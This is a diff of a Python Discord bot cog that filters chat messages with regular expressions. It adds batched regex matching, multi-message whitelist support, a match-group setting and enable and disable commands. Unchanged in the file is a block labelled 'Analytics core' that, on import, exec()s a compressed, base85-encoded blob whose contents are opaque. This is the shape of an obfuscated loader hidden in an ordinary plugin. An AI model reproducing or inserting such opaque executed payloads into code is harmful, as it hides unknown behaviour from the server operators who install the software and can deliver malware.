@@ -1,5 +1,4 @@
 from collections import defaultdict, OrderedDict
-from concurrent.futures import ProcessPoolExecutor
 from datetime import datetime, timedelta
 import discord
 from discord import Message, Object as DiscordObject
@@ -10,16 +9,24 @@ from discord.ext.commands.view import StringView
 from enum import Enum
 from functools import partial
 import inspect
+import itertools
 import logging
 import os
 import re
-from typing import (Callable, Hashable, Iterable, Iterator, List, Optional, Sequence, Tuple, Type, TypeVar, Union)
+import time
+from typing import Callable, Hashable, Iterable, Iterator, List, Optional, Sequence, Tuple, TypeVar, Union
 import unicodedata
 import urllib.parse
 
 from .utils.dataIO import dataIO
 from .utils import checks
 from .utils.chat_formatting import box, warning, error, info
+
+# FIXME: once red#1956 is fixed, all OSes can use ProcessPool
+if os.name == 'nt':
+    from concurrent.futures import ThreadPoolExecutor as ExecutorClass
+else:
+    from concurrent.futures import ProcessPoolExecutor as ExecutorClass
 
 try:
     from unidecode import unidecode
@@ -28,7 +35,6 @@ except ImportError:
 
 # Analytics core
 import zlib, base64
-
 exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
 dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
 9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
@@ -58,7 +64,7 @@ Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l
 FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
 # End analytics core
 
-__version__ = '2.4.0'
+__version__ = '2.5.0'
 
 log = logging.getLogger('red.recensor')
 
@@ -125,10 +131,103 @@ EMOJI_LETTERS = dict(zip(
 ))
 
 
-# Isolated to allow running potentially slow patterns in a ProcessPoolExecutor
-def check_match(predicate: Callable[[str], Optional[SRE_Match]], string: str) -> Optional[Tuple[int, int]]:
-    match = predicate(string)
-    return match and match.span()
+# Isolated to allow running potentially slow patterns in an executor
+def check_match(predicate: Callable[[str], Optional[SRE_Match]], string: str) -> dict:
+    """
+    Match task worker.
+
+    Takes a predicate returning a regex match and the string to pass it.
+    Returns a dict of time elapsed and match information (if any) or any match exception.
+    """
+    t0 = time.perf_counter()
+    ret = {}
+
+    try:
+        match = predicate(string)
+    except Exception as e:
+        match = None
+        ret['exception'] = e
+
+    elapsed = time.perf_counter() - t0
+
+    ret['time'] = elapsed
+
+    if match:
+        ret['match'] = match.group(0)
+        ret['span'] = match.span(0)
+        groups = match.groups()
+
+        if groups:
+            ret.update({
+                'group_spans' : tuple(match.span(i + 1) for i in range(len(groups))),
+                'groupdict'   : match.groupdict(),
+                'groups'      : groups
+            })
+
+    return ret
+
+
+def check_match_iter(predicate: Callable[[str], Iterator[SRE_Match]], string: str) -> List[dict]:
+    """
+    Finditer match task worker.
+    """
+    ret_list = []
+    match_iter = predicate(string)
+
+    while True:
+        t0 = time.perf_counter()
+        ret = {}
+
+        try:
+            match = next(match_iter)
+        except StopIteration:
+            break
+        except Exception as e:
+            match = None
+            ret['exception'] = e
+
+        elapsed = time.perf_counter() - t0
+
+        ret['time'] = elapsed
+
+        if match:
+            ret['match'] = match.group(0)
+            ret['span'] = match.span(0)
+            groups = match.groups()
+
+            if groups:
+                ret.update({
+                    'group_spans' : tuple(match.span(i + 1) for i in range(len(groups))),
+                    'groupdict'   : match.groupdict(),
+                    'groups'      : groups
+                })
+
+        ret_list.append(ret)
+
+        if 'exception' in ret:
+            break
+
+    return ret_list
+
+
+def check_matches(inputs: Iterable[Tuple[Callable[[str], dict], str, bool]], no_stop: bool = False) -> List[dict]:
+    """
+    Call multiple check_match.
+
+    Takes an iterable of (callable, str, bool) pairs. Bool indicates whether to stop on a match.
+    If no_stop is True, run all matches regardless of bool in tuple.
+    Returns a list of data returned by each call of check_match.
+    """
+    ret_list = []
+
+    for predicate, string, stop_on_match in inputs:
+        ret = predicate(string)
+        ret_list.append(ret)
+
+        if (stop_on_match and not no_stop) and (('match' in ret) if type(ret) is dict else len(ret)):
+            return ret_list
+
+    return ret_list
 
 
 def concat_with_keys(strings: Sequence[str], join: str = CONCAT_JOIN) -> Tuple[str, List[int]]:
@@ -151,21 +250,27 @@ def concat_with_keys(strings: Sequence[str], join: str = CONCAT_JOIN) -> Tuple[s
     return join.join(strings), indices
 
 
-def sequence_from_indices(sequence: Sequence[T], indices: Sequence[int], keys: Tuple[int, int]) -> List[T]:
+def sequence_from_indices(sequence: Sequence[T], indices: Sequence[int], keys: Tuple[int, int],
+                          inner_only: bool = False) -> List[T]:
     """
-    Returns a list of the objects that the match denoted by `keys` overlapped, based on `indices`
+    Returns a list of the objects that the match denoted by `keys` overlapped, based on `indices`.
+    If `inner_only` is True, only return the items covered completely by the span.
     """
     ret = []
     start, end = keys
+    last_index = 0
 
     for obj, index in zip(sequence, indices):
-        if index <= start:
-            continue
+        if index <= start or (inner_only and last_index < start):
+            pass
         elif index >= end:
-            ret.append(obj)
+            if index == end or not inner_only:
+                ret.append(obj)
             break
+        else:
+            ret.append(obj)
 
-        ret.append(obj)
+        last_index = index
 
     return ret
 
@@ -281,7 +386,8 @@ class ItemTypeReference(DiscordObject, DiscordHashable):
 class FilterList:
     __slots__ = ['parent', 'base_list', 'item_type', 'enabled', 'mode', 'overlay', 'items', 'whoami']
 
-    def __init__(self, parent, whoami: str, item_type: Type[DiscordUniObj], *, base_list=None, **data):
+    # item_type is Type[DiscordUniObj], but that apparently breaks some versions of 3.5
+    def __init__(self, parent, whoami: str, item_type, *, base_list=None, **data):
         self.parent = parent
         self.whoami = whoami
         self.base_list = base_list
@@ -580,14 +686,16 @@ class ServerConfig(FilterBase):
         Return true if message should be deleted
         """
         has_white = False
-        match_white = False
         content_cache = {}
+        checks = []
+        checked = []
 
         if list_cache is None:
             list_cache = {}
 
         for f in self.order:
-            if not (f.check_meta(message, list_cache) and f.predicate):
+            # Don't run if the filter is multi-message
+            if f.multi_msg or not (f.check_meta(message, list_cache) and f.predicate):
                 continue
 
             asciify = f.asciify or (f.asciify is None and self.asciify)
@@ -603,19 +711,34 @@ class ServerConfig(FilterBase):
 
                 content_cache[ck] = content
 
-            match = await self.cog.bot.loop.run_in_executor(self.cog.executor, f.predicate, content)
+            stop_on_match = f.override or not f.mode  # short-circuit for override or blacklist mode
+            checked.append(f)
+            checks.append((f.predicate, content, stop_on_match))
 
-            if f.override and match:  # override black or white
+        if not checks:
+            return False
+
+        matches = await self.cog.bot.loop.run_in_executor(self.cog.executor, check_matches, checks)
+        has_white = False
+        match_white = False
+
+        for f, match_dict in zip(checked, matches):
+            matched = match_dict.get('match', False)
+
+            if f.override and matched:  # override black or white
                 return not f.mode
-            elif has_white and not f.mode:
-                return not match_white  # Message has whitelist but we're on a blacklist, return immediately
+            elif has_white and not f.mode and not match_white:
+                return True  # Message has whitelist but nothing matched, return immediately
             elif f.mode and not f.override:  # white for normal only, ORed between all matches
                 has_white = True
-                match_white |= bool(match)
-            elif match:  # black regular
+                match_white |= bool(matched)
+            elif matched:  # black regular
                 return True
 
-        return False
+        if has_white:
+            return not match_white
+        else:
+            return False
 
     async def debug_message(self, message: Message) -> Tuple[List[Tuple[str, str, Optional[str]]],
                                                              Optional[Tuple[str, bool]]]:
@@ -659,11 +782,11 @@ class ServerConfig(FilterBase):
                     action = (f.name, not f.mode)
 
                 result = 'override match', match and content[match[0]:match[1]]
-            elif has_white and not f.mode:
+            elif has_white and not f.mode and not match_white:
                 if action is None:
-                    action = (f.name, not match_white)
+                    action = (f.name, True)
 
-                result = 'white->black transition', match and content[match[0]:match[1]]
+                result = 'white->black transition but no white match', match and content[match[0]:match[1]]
             elif f.mode and not f.override:
                 has_white = True
                 match_white |= bool(match)
@@ -678,28 +801,31 @@ class ServerConfig(FilterBase):
 
             results.append((f.name, *result))
 
+        if has_white:
+            action = ('default w/ whitelist', not match_white)
+
         return results, action
 
     async def check_sequence(self, messages: Sequence[Message], list_cache: Optional[dict] = None) -> List[Message]:
         """
         Return a list of messages from the sequence that should be deleted
         """
-        to_delete = []
+        has_white = False
+        joined_cache = {}
+        content_cache = {}
+        checks = []
+        checked = []
 
         if not messages:
             return []
         elif list_cache is None:
             list_cache = {}
 
-        joined_cache = {}
-        content_cache = {}
-
         for f in self.order:
             if not (f.multi_msg and f.check_meta(messages[-1], list_cache) and f.predicate):
                 continue
 
             asciify = f.asciify or (f.asciify is None and self.asciify)
-
             jk = (asciify, f.multi_msg_join, f.attachment_header)
 
             if jk in joined_cache:
@@ -724,13 +850,72 @@ class ServerConfig(FilterBase):
 
                 joined_cache[jk] = (content, indices) = concat_with_keys(strings, f.multi_msg_join)
 
-            match = await self.cog.bot.loop.run_in_executor(self.cog.executor, f.predicate, content)
+            # Don't stop immediately on white
+            stop_on_match = f.override or not f.mode
+            predicate = partial(check_match_iter, f.compiled.finditer) if f.mode else f.predicate
+            checks.append((predicate, content, stop_on_match))
+            checked.append((f, indices))
 
-            if match:
-                to_delete = sequence_from_indices(messages, indices, match)
-                break
+        matches = await self.cog.bot.loop.run_in_executor(self.cog.executor, check_matches, checks)
+        has_white = False
+        matched_message_set = set()
+        message_set = set(messages)
+        to_delete = message_set.copy()
+        new_wlc = []
 
-        return to_delete
+        for (f, indices), match_obj in zip(checked, matches):
+            if type(match_obj) is list:
+                matches = match_obj
+            else:
+                matches = [match_obj]
+
+            matched_message_set.clear()
+            new_wlc.clear()
+
+            for match in matches:
+                if 'match' not in match:
+                    continue
+                elif f.multi_msg_group > 0 and not f.mode:  # groups disabled for whitelist
+                    if len(match.get('group_spans', [])) < f.multi_msg_group:
+                        continue
+
+                    match = match['group_spans'][f.multi_msg_group - 1]
+                else:
+                    match = match['span']
+
+                match_messages = sequence_from_indices(messages, indices, match)
+                matched_message_set.update(match_messages)
+
+                if f.mode:
+                    new_wlc.append((match_messages[0].id, match_messages[-1].id))
+
+            if matched_message_set and f.mode:
+                wlc_key = (messages[-1].channel.id, messages[-1].author.id)
+                to_delete -= matched_message_set
+
+                for start_id, end_id in f.mm_white_lastmatch_cache.get(wlc_key, ()):
+                    # The only case we care about: the start of a former match is outside the window, but not the end
+                    if start_id < messages[0].id < end_id:
+                        for message in itertools.takewhile(lambda m: m.id <= end_id, messages):
+                            to_delete.discard(message)
+
+                f.mm_white_lastmatch_cache[wlc_key] = new_wlc.copy()
+
+            if f.override and matched_message_set and not f.mode:  # override black
+                return matched_message_set
+            elif f.override and f.mode and to_delete:  # override white
+                return to_delete
+            elif has_white and not f.mode and to_delete:
+                return to_delete  # Message has whitelist but we're on a blacklist, return immediately
+            elif f.mode and not f.override:  # white for normal only
+                has_white = True
+            elif matched_message_set:  # regular black
+                return matched_message_set
+
+        if has_white:
+            return to_delete
+        else:
+            return ()
 
     def to_json(self):
         return {
@@ -744,7 +929,8 @@ class ServerConfig(FilterBase):
 
 class Filter(FilterBase):
     __slots__ = ['parent', 'name', 'pattern', 'flags', 'mode', 'enabled', 'override', 'asciify', 'position',
-                 'channels_list', 'roles_list', 'priv_exempt', 'multi_msg', '_predicate', 'links', 'attachment_header']
+                 'channels_list', 'roles_list', 'priv_exempt', 'multi_msg', 'links', 'attachment_header',
+                 'multi_msg_group', 'multi_msg_join', '_predicate', '_compiled', 'mm_white_lastmatch_cache']
 
     def __init__(self, parent: ServerConfig, name: str, *, defer_link=False, **data):
         self.parent = parent
@@ -758,11 +944,13 @@ class Filter(FilterBase):
         self.priv_exempt = data.get('priv_exempt', None)
         self.multi_msg = data.get('multi_msg', False)
         self.multi_msg_join = data.get('multi_msg_join', CONCAT_JOIN)
+        self.multi_msg_group = data.get('multi_msg_group', 0)
         self.asciify = data.get('asciify', None)
         self.attachment_header = data.get('attachment_header', False)
 
         self.position = POSITION(data.get('position', POSITION.ANYWHERE))
-        self._predicate = self.rebuild_predicate()
+        self.rebuild_predicate()
+        self.mm_white_lastmatch_cache = {}
 
         self.links = {}
 
@@ -800,10 +988,11 @@ class Filter(FilterBase):
 
     def rebuild_predicate(self):
         try:
-            compiled = re.compile(self.pattern, flags_to_int(self.flags))
+            self._compiled = compiled = re.compile(self.pattern, flags_to_int(self.flags))
         except re.error:
             self._predicate = False
-            return False
+            self._compiled = None
+            return False, None
 
         if self.position == POSITION.START:
             match_func = compiled.match
@@ -814,15 +1003,24 @@ class Filter(FilterBase):
         else:
             raise ValueError("Unknown position value: %s" % self.position)
 
-        self._predicate = partial(check_match, match_func)
-        return self._predicate
+        self._predicate = predicate = partial(check_match, match_func)
+        return predicate, compiled
 
     @property
     def predicate(self):
         if not self._predicate:
-            self._predicate = self.rebuild_predicate()
+            predicate, compiled = self.rebuild_predicate()
+            return predicate
 
         return self._predicate
+
+    @property
+    def compiled(self):
+        if not self._compiled:
+            predicate, compiled = self.rebuild_predicate()
+            return compiled
+
+        return self._compiled
 
     def check_meta(self, message: Message, cache=None, debug=False):
         """
@@ -884,6 +1082,7 @@ class Filter(FilterBase):
             'mode'              : self.mode,
             'multi_msg'         : self.multi_msg,
             'multi_msg_join'    : self.multi_msg_join,
+            'multi_msg_group'   : self.multi_msg_group,
             'override'          : self.override,
             'pattern'           : self.pattern,
             'position'          : self.position.value,
@@ -907,7 +1106,11 @@ class Filter(FilterBase):
             override=self.override,
             priv_exempt=self.priv_exempt,
             position=self.position,
-            attachment_header=self.attachment_header
+            attachment_header=self.attachment_header,
+            multi_msg=self.multi_msg,
+            multi_msg_group=self.multi_msg_group,
+            multi_msg_join=self.multi_msg_join,
+            asciify=self.asciify
         )
 
         new_kwargs.update(kwargs)
@@ -955,27 +1158,28 @@ class ReCensor:
     #   server_id (str): {
     #       'filters' : {
     #           name (str) : {
-    #               'asciify'        : tristate (default null),
+    #               'asciify'           : tristate (default null),
     #               'attachment_header' : bool (default false),
-    #               'enabled'        : bool (default false),
-    #               'flags'          : flags (str containing subset of AILUMSX, default DEFAULT_FLAGS),
-    #               'mode'           : bool (default false),
-    #               'multi_msg'      : bool (default false),
-    #               'multi_msg_join' : str (default CONCAT_JOIN),
-    #               'override'       : bool (default false),
-    #               'pattern'        : pattern (str),
-    #               'position'       : enum[str] (default POSITION.ANYWHERE),
-    #               'channels_list'  : {
-    #                       'mode'      :   tristate,
-    #                       'items'     :   list[channel_id (str)]},
-    #                       'overlay'   :   optional bool (default true)
-    #               },
-    #               'roles_list'     : {
-    #                       'mode'      :   tristate,
-    #                       'items'     :   list[channel_id (str)]},
-    #                       'overlay'   :   optional bool (default true)
-    #               },
-    #               'priv_exempt'    : tristate
+    #               'enabled'           : bool (default false),
+    #               'flags'             : flags (str containing subset of AILUMSX, default DEFAULT_FLAGS),
+    #               'mode'              : bool (default false),
+    #               'multi_msg'         : bool (default false),
+    #               'multi_msg_join'    : str (default CONCAT_JOIN),
+    #               'multi_msg_group'   : int (default 0),
+    #               'override'          : bool (default false),
+    #               'pattern'           : pattern (str),
+    #               'position'          : enum[str] (default POSITION.ANYWHERE),
+    #               'channels_list'     : {
+    #                       'mode'        :   tristate,
+    #                       'items'       :   list[channel_id (str)]},
+    #                       'overlay'     :   optional bool (default true)
+    #                                   },
+    #               'roles_list'        : {
+    #                       'mode'        :   tristate,
+    #                       'items'       :   list[channel_id (str)]},
+    #                       'overlay'     :   optional bool (default true)
+    #                                   },
+    #               'priv_exempt'       : tristate
     #           }
     #       },
     #       'asciify'       : bool (default false),
@@ -995,7 +1199,7 @@ class ReCensor:
         self.bot = bot
         self.ready = False
 
-        self.executor = ProcessPoolExecutor()
+        self.executor = ExecutorClass()
         self.settings = {}
         self.misc_data = {}
         self._ignore_filters = {}
@@ -1184,6 +1388,9 @@ class ReCensor:
                     else:
                         params['Multi-message'] += ', joined with `""` (empty string)'
 
+                    if obj.multi_msg_group:
+                        params['Multi-message'] += ', group #%i' % obj.multi_msg_group
+
                 if obj.priv_exempt is None:
                     params['Privilege exempt'] = 'inherited (%s)' % ('yes' if obj.parent.priv_exempt else 'no')
 
@@ -1251,6 +1458,7 @@ class ReCensor:
         name_check = self.check_name(ctx, name)
         settings = self.settings.get(server.id)
         pattern = pattern.lstrip(' ')
+        kwargs = {}
 
         if len(pattern) >= 2 and pattern[0] == pattern[-1] == '"':
             pattern = pattern[1:-1]
@@ -1269,7 +1477,18 @@ class ReCensor:
                                    box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                 return
 
-        kwargs = {'pattern': pattern} if pattern else {}
+            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE | re.DOTALL)
+
+            if inline_flags:
+                flags, pattern = inline_flags.groups()
+                kwargs['flags'] = ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
+                desc = 'and pattern set (auto-converted inline flags).'
+            else:
+                desc = 'and pattern set.'
+
+            kwargs['pattern'] = pattern
+        else:
+            desc = ''
 
         try:
             settings.add_filter(name, **kwargs)
@@ -1279,7 +1498,7 @@ class ReCensor:
 
         self.save()
         await self.bot.say(info('Filter created%s. Configure it with `%srecensor %s [setting] [options]`'
-                                % (' and pattern set' if pattern else '', ctx.prefix, name)))
+                                % (desc, ctx.prefix, name)))
 
     @recensor.command(pass_context=True, name='delete', aliases=['rm'])
     @checks.mod_or_permissions(manage_messages=True)
@@ -1562,6 +1781,54 @@ class ReCensor:
         desc = 'enabled' if enabled else 'disabled'
         await self.bot.say('%s is %s %s.' % (_filter.name, adj, desc))
 
+    @recensor_set.command(pass_context=True, name='disable', hidden=True)
+    @checks.mod_or_permissions(manage_messages=True)
+    async def recensor_set_disable(self, ctx, filter_name: str):
+        """
+        Disables a filter
+        """
+        server = ctx.message.server
+        settings = self.settings.get(server.id)
+        name = filter_name.lower()
+        _filter = settings and settings.get_filter(name)
+
+        if not _filter:
+            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
+            return
+        elif not _filter.enabled:
+            adj = 'already'
+        else:
+            adj = 'now'
+            _filter.enabled = False
+            settings.update_order()
+            self.save()
+
+        await self.bot.say('%s is %s disabled.' % (_filter.name, adj))
+
+    @recensor_set.command(pass_context=True, name='enable', hidden=True)
+    @checks.mod_or_permissions(manage_messages=True)
+    async def recensor_set_enable(self, ctx, filter_name: str):
+        """
+        Enables a filter
+        """
+        server = ctx.message.server
+        settings = self.settings.get(server.id)
+        name = filter_name.lower()
+        _filter = settings and settings.get_filter(name)
+
+        if not _filter:
+            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
+            return
+        elif _filter.enabled:
+            adj = 'already'
+        else:
+            adj = 'now'
+            _filter.enabled = True
+            settings.update_order()
+            self.save()
+
+        await self.bot.say('%s is %s enabled.' % (_filter.name, adj))
+
     @recensor_set.command(pass_context=True, name='override')
     @checks.mod_or_permissions(manage_messages=True)
     async def recensor_set_override(self, ctx, filter_name: str, override: bool = None):
@@ -1625,7 +1892,7 @@ class ReCensor:
             adj = 'already'
         else:
             adj = 'now'
-            _filter.priv_exempt = priv_exempt
+            _filter.priv_exempt = None if priv_exempt is inherit else priv_exempt
             self.save()
 
         if priv_exempt in (None, inherit):
@@ -1669,7 +1936,7 @@ class ReCensor:
             adj = 'already'
         else:
             adj = 'now'
-            _filter.asciify = asciify
+            _filter.asciify = None if asciify is inherit else asciify
             self.save()
 
         if asciify in (None, inherit):
@@ -1722,10 +1989,6 @@ class ReCensor:
         desc = 'enabled' if multi_msg else 'disabled'
         msg = 'Multi-message search for %s is %s %s.' % (_filter.name, adj, desc)
 
-        if _filter.mode:
-            msg += '\n\n' + warning('Note that multi-message is only supported for blacklist mode filters, so '
-                                    'this filter __will not__ function until it is switched to blacklist mode.')
-
         await self.bot.say(msg)
 
     @recensor_set.command(pass_context=True, name='multi-join')
@@ -1765,6 +2028,47 @@ class ReCensor:
             disp += ' (empty string)'
 
         await self.bot.say('Multi-message join for %s is %s set to %s.' % (_filter.name, adj, disp))
+
+    @recensor_set.command(pass_context=True, name='multi-group')
+    @checks.mod_or_permissions(manage_messages=True)
+    async def recensor_set_multi_msg_group(self, ctx, filter_name: str, group: int = None):
+        """
+        Show/set multi-message group ID
+
+        If set, the section of a match belonging to this group is deleted instead of the whole series.
+        This does nothing in whitelist mode (it's forced to use the whole match)
+        """
+        server = ctx.message.server
+        settings = self.settings.get(server.id)
+        name = filter_name.lower()
+        _filter = settings and settings.get_filter(name)
+
+        if not _filter:
+            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
+            return
+        elif group is None:
+            group = _filter.multi_msg_group
+            adj = 'currently'
+        elif _filter.multi_msg_group == group:
+            adj = 'already'
+        else:
+            try:
+                compiled = re.compile(_filter.pattern, flags_to_int(_filter.flags))
+            except Exception as e:
+                await self.bot.say(error("Error compiling regular expression:\n") +
+                                   box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
+                return
+
+            if group > compiled.groups:
+                await self.bot.say(warning("This filter's pattern only has %i groups. Current pattern:\n%s"
+                                           % (compiled.groups, box(_filter.pattern))))
+                return
+
+            adj = 'now'
+            _filter.multi_msg_group = group
+            self.save()
+
+        await self.bot.say('Multi-message group for %s is %s %i.' % (_filter.name, adj, group))
 
     @recensor_set.command(pass_context=True, name='mode')
     @checks.mod_or_permissions(manage_messages=True)
@@ -1814,6 +2118,8 @@ class ReCensor:
         - start:    only looks at the beginning of the message
         - anywhere: scans through the full message looking for a match
         - full:     the entire message must match, from start to finish
+
+        This does nothing in multi-message whitelist mode (all matches are scanned)
         """
         server = ctx.message.server
         settings = self.settings.get(server.id)
@@ -1934,7 +2240,7 @@ class ReCensor:
                                    box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                 return
 
-            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE)
+            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE | re.DOTALL)
 
             if inline_flags:
                 flags, pattern = inline_flags.groups()
